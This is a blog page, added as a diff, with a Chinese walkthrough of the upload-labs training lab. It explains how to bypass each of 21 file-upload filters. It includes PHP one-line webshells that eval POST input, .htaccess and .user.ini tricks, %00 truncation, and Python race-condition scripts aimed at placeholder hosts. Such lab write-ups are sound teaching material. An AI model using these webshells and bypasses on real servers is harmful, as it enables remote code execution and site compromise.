@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="p0l1st">
+
+
+
+    <meta name="description" content="blog">
+
+
+
+<title>upload-labs通关 | p0l1st&#39;s blog</title>
+
+
+
+    <link rel="icon" href="/b.png">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="p0l1st's blog" type="application/atom+xml">
+</head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">p0l1st&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">p0l1st&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">upload-labs通关</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">p0l1st</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">January 14, 2024&nbsp;&nbsp;20:31:21</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="pass-01"><a href="#pass-01" class="headerlink" title="pass-01"></a>pass-01</h1><p>第一关前端js校验</p>
+<h2 id="修改前端js代码"><a href="#修改前端js代码" class="headerlink" title="修改前端js代码"></a>修改前端js代码</h2><p>F12查看</p>
+<p><img src="/../images/image-20240114165858038.png" alt="image-20240114165858038"></p>
+<p>删除onsubmit&#x3D;”return checkFile()即可</p>
+<p><img src="/../images/image-20240114165939413.png" alt="image-20240114165939413"></p>
+<h2 id="禁用js"><a href="#禁用js" class="headerlink" title="禁用js"></a>禁用js</h2><p><img src="/../images/image-20240114170135474.png" alt="image-20240114170135474"></p>
+<h2 id="burp抓包绕过"><a href="#burp抓包绕过" class="headerlink" title="burp抓包绕过"></a>burp抓包绕过</h2><p>将文件后缀设置为jpg，然后抓包</p>
+<p><img src="/../images/image-20240114170335837.png" alt="image-20240114170335837"></p>
+<p>再将后缀修改为php</p>
+<p><img src="/../images/image-20240114170452423.png" alt="image-20240114170452423"></p>
+<p>上传成功</p>
+<p><img src="/../images/image-20240114170520495.png" alt="image-20240114170520495"></p>
+<h1 id="pass-02"><a href="#pass-02" class="headerlink" title="pass-02"></a>pass-02</h1><p>第二关检查文件的MIME</p>
+<p>上传1.php，抓包</p>
+<p><img src="/../images/image-20240114170717164.png" alt="image-20240114170717164"></p>
+<p>修改application&#x2F;octet-stream为image&#x2F;jpeg</p>
+<p><img src="/../images/image-20240114170757296.png" alt="image-20240114170757296"></p>
+<p>上传成功</p>
+<p><img src="/../images/image-20240114170816342.png" alt="image-20240114170816342"></p>
+<h1 id="pass-03"><a href="#pass-03" class="headerlink" title="pass-03"></a>pass-03</h1><p>第三关禁止上传.asp|.aspx|.php|.jsp后缀文件</p>
+<p>把后缀改为phtml</p>
+<p><img src="/../images/image-20240114171126874.png" alt="image-20240114171126874"></p>
+<p>后缀也可以为.phps .php5 .pht</p>
+<p>但是要配置apache的httpd.conf</p>
+<h1 id="pass-04"><a href="#pass-04" class="headerlink" title="pass-04"></a>pass-04</h1><p>第四关本pass禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf后缀文件</p>
+<p>这里我们可以上传.htaccess</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure>
+
+<p>然后上传123.jpg</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_POST[&#x27;cmd&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20240114182751072.png" alt="image-20240114182751072"></p>
+<h1 id="pass-05"><a href="#pass-05" class="headerlink" title="pass-05"></a>pass-05</h1><p>第五关源码如下</p>
+<p><img src="/../images/image-20240114183134209.png" alt="image-20240114183134209"></p>
+<p>也就是说这里会删除文件名末尾的.，然后再删除空格</p>
+<p>那么我们可以构造 1.php. .</p>
+<p>burp抓包修改</p>
+<p><img src="/../images/image-20240114183309858.png" alt="image-20240114183309858"></p>
+<p>或者上传.user.ini</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=123.jpg</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="pass-06"><a href="#pass-06" class="headerlink" title="pass-06"></a>pass-06</h1><p>第六关相较于第五关没有转换小写</p>
+<p>利用大小写混合绕过即可</p>
+<h1 id="pass-07"><a href="#pass-07" class="headerlink" title="pass-07"></a>pass-07</h1><p>第七关没有使用trim()删除空格，使用空格绕过</p>
+<p><img src="/../images/image-20240114190157349.png" alt="image-20240114190157349"></p>
+<h1 id="pass-08"><a href="#pass-08" class="headerlink" title="pass-08"></a>pass-08</h1><p>第八关没有使用deldot()过滤文件名末尾的点，加.绕过即可</p>
+<p><img src="/../images/image-20240114190459873.png" alt="image-20240114190459873"></p>
+<h1 id="pass-09"><a href="#pass-09" class="headerlink" title="pass-09"></a>pass-09</h1><p>第九关没有对::DATA进行处理，使用::DATA绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php在window的时候如果文件名+&quot;::$DATA&quot;会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持&quot;::$DATA&quot;之前的文件名 </span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20240114190713407.png" alt="image-20240114190713407"></p>
+<h1 id="pass-10"><a href="#pass-10" class="headerlink" title="pass-10"></a>pass-10</h1><p>与第五关相同</p>
+<h1 id="pass-11"><a href="#pass-11" class="headerlink" title="pass-11"></a>pass-11</h1><p>第十一关的关键点在于</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</span><br></pre></td></tr></table></figure>
+
+<p>会对黑名单中的关键名进行删除，使用双写绕过</p>
+<p><img src="/../images/image-20240114191142923.png" alt="image-20240114191142923"></p>
+<h1 id="pass-12"><a href="#pass-12" class="headerlink" title="pass-12"></a>pass-12</h1><p>第十二关使用白名单限制了上传类型，但是上传路径是可以控制的</p>
+<p>可以使用%00截断，但是应该注意使用%00截断php版本必须在5.3.4以下</p>
+<p><img src="/../images/image-20240114192030797.png" alt="image-20240114192030797"></p>
+<h1 id="pass-13"><a href="#pass-13" class="headerlink" title="pass-13"></a>pass-13</h1><p>与第十二关类似，但是是POST方式修改</p>
+<p><img src="/../images/image-20240114192240418.png" alt="image-20240114192240418"></p>
+<p>POST不会自行解码，所以需要对%00进行编码</p>
+<h1 id="pass-14"><a href="#pass-14" class="headerlink" title="pass-14"></a>pass-14</h1><p>图片马+文件包含</p>
+<p><img src="/../images/image-20240114192923423.png" alt="image-20240114192923423"></p>
+<h1 id="pass-15"><a href="#pass-15" class="headerlink" title="pass-15"></a>pass-15</h1><p>同第十四关</p>
+<h1 id="pass-16"><a href="#pass-16" class="headerlink" title="pass-16"></a>pass-16</h1><p>同第十四关</p>
+<h1 id="pass-17"><a href="#pass-17" class="headerlink" title="pass-17"></a>pass-17</h1><p>第十七关使用了二次渲染，判断了后缀名、content-type，利用imagecreatefromgif判断是否为gif图片，最后二次渲染。</p>
+<p>正常流程我们需要上传gif图片，然后下载渲染后的图片，对比两者不变的地方，插入一句话，然后再包含</p>
+<p>这里使用大佬的gif</p>
+<p><img src="/../images/image-20240114194122744.png" alt="image-20240114194122744"></p>
+<h1 id="pass-18"><a href="#pass-18" class="headerlink" title="pass-18"></a>pass-18</h1><p>条件竞争</p>
+<p>如果上传的不是jpg,png,gif文件，那么会删除，我们可以利用burp不停的发包上传可以生成一句话的php文件，然后访问这个文件，如果访问成功，则一句话成功上传</p>
+<p><img src="/../images/image-20240114194802051.png" alt="image-20240114194802051"></p>
+<p><img src="/../images/image-20240114200650768.png" alt="image-20240114200650768"></p>
+<p>脚本如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;])?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>利用python:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://xxxx/upload/w.php&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    html = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> html.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>上传成功</p>
+<p><img src="/../images/image-20240114200842372.png" alt="image-20240114200842372"></p>
+<p><img src="/../images/image-20240114200852785.png" alt="image-20240114200852785"></p>
+<h1 id="pass-19"><a href="#pass-19" class="headerlink" title="pass-19"></a>pass-19</h1><p>同第十八关，但是需要改为上传图片马，利用文件包含执行图片马的内容</p>
+<p>python：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://xxx/upload-labs/include.php?file=upload/pass19.png&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    html = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> ( <span class="string">&#x27;Warning&#x27;</span>  <span class="keyword">not</span> <span class="keyword">in</span>  <span class="built_in">str</span>(html.text)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;ok&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="pass-20"><a href="#pass-20" class="headerlink" title="pass-20"></a>pass-20</h1><p>在save_name处%00截断，注意编码和php版本</p>
+<p><img src="/../images/image-20240114201530423.png" alt="image-20240114201530423"></p>
+<p>move_upload_file()会忽略文件末尾的.&#x2F;</p>
+<p><img src="/../images/image-20240114201839844.png" alt="image-20240114201839844"></p>
+<h1 id="pass-21"><a href="#pass-21" class="headerlink" title="pass-21"></a>pass-21</h1><p>数组绕过</p>
+<p><img src="/../images/image-20240114202827590.png" alt="image-20240114202827590"></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>p0l1st</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2024/01/14/upload-labs%E9%80%9A%E5%85%B3/">http://example.com/2024/01/14/upload-labs%E9%80%9A%E5%85%B3/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-web%E5%AE%89%E5%85%A8/"># 文件上传 web安全</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2024/01/14/2024%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98/">2024寒假刷题</a>
+            
+            
+            <a class="next" rel="next" href="/2023/12/31/SSI%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">SSI远程命令执行</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© p0l1st | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
